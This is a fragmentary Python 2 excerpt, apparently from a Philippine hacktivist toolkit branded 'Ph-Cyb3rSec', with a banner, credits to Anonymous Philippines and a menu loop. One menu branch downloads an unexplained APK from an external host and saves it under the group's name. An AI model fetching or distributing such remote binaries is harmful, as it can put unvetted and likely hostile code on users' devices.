...
def __banner__():
	print "%s      _                              %s" % (Y,N)
	print "%s _ _ | |_  _ _  ___  _____  ___  ___  %s{%s-Ph-Cyb3rSec-#dev%s}%s" % (Y,W,Y,W,N)
	print "%s| | || . || | || . ||     || .'|| . |%s" % (Y,N)
...
credits=('''%s
Credits
	Support Anonymous Philippines!
	Visit, Like & Share our page for more info (https://www.facebook.com/PhilippineCyb3rSec/)
    Thanks to Mr.Cyb3rSec-UnKn0wN | Mr.Cyb3rSec-Cyb3rPN-Tools | Mr.Cyb3rSec-Cyb3r3r | Mr.Cyb3rSec-WolfW4rR?0r
...
while opt:
	...
	if vbugmap.strip() in 'help'.split():
		...
		if apkfile.strip() in "01 1".split():
			...
			urllib.urlretrieve("http://override.waper.co/files/b55db82cd4b45d3d6c0b9c86896431.apk", 'Ph-Cyb3rSec.apk')
		else:
